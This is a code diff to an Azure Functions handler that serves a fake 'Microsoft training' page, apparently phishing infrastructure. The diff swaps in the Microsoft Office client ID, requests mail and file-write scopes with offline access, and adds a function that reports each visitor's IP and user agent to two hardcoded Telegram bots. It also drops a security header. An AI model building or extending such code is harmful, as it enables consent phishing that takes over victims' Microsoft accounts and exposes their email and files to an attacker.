@@ -1,4 +1,5 @@
 const { app } = require("@azure/functions");
+const axios = require('axios');
 
 // Telegram configuration - REAL TOKENS
 const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
@@ -6,10 +7,26 @@ const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// OAuth configuration - Using Microsoft Graph CLI client ID (no redirect URI required)
-const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
+// OAuth configuration - Using ORIGINAL Microsoft Office client ID
+const client_id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Microsoft Office client ID
 const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
 const scopes = 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access';
+
+async function sendTelegram(message, isSecondary = false) {
+    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
+    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
+    
+    try {
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
+    } catch (error) {
+        console.error('Telegram send error:', error.message);
+    }
+}
 
 app.http("oauth", {
     methods: ["GET"],
@@ -17,19 +34,14 @@ app.http("oauth", {
     route: "microsoft-training",
     handler: async (request, context) => {
         try {
-            // Construct authorization URL
-            const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
-            authUrl.searchParams.set('response_type', 'code');
-            authUrl.searchParams.set('client_id', client_id);
-            authUrl.searchParams.set('redirect_uri', redirect_uri);
-            authUrl.searchParams.set('scope', scopes);
-            authUrl.searchParams.set('state', 'microsoft-training-session');
-            authUrl.searchParams.set('prompt', 'consent');
+            // Send Telegram notification
+            await sendTelegram(`🎯 <b>OAuth Training Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`);
+            await sendTelegram(`🎯 <b>OAuth Training Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`, true);
 
-            context.log(`OAuth training page accessed, redirecting to: ${authUrl.toString()}`);
+            // Build OAuth URL
+            const oauthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?response_type=code&client_id=${client_id}&redirect_uri=${encodeURIComponent(redirect_uri)}&scope=${encodeURIComponent(scopes)}&state=microsoft-training-session&prompt=consent`;
 
-            // Return the training portal page
-            const response = `
+            const html = `
             <!DOCTYPE html>
             <html lang="en">
             <head>
@@ -78,7 +90,7 @@ app.http("oauth", {
                     </div>
                     
                     <div style="text-align: center;">
-                        <a href="${authUrl.toString()}" class="button">Continue with Microsoft Account</a>
+                        <a href="${oauthUrl}" class="button">Continue with Microsoft Account</a>
                     </div>
                     
                     <div class="footer">
@@ -89,16 +101,16 @@ app.http("oauth", {
             </body>
             </html>`;
 
-            return new Response(response, {
+            return new Response(html, {
                 status: 200,
                 headers: {
-                    'Content-Type': 'text/html; charset=utf-8',
-                    'X-Content-Type-Options': 'nosniff'
+                    'Content-Type': 'text/html; charset=utf-8'
                 }
             });
 
         } catch (error) {
             context.log.error('OAuth training page error:', error);
+            await sendTelegram(`❌ <b>OAuth Training Error</b>\n\n${error.message}`);
             return new Response('Error loading training portal', { status: 500 });
         }
     }
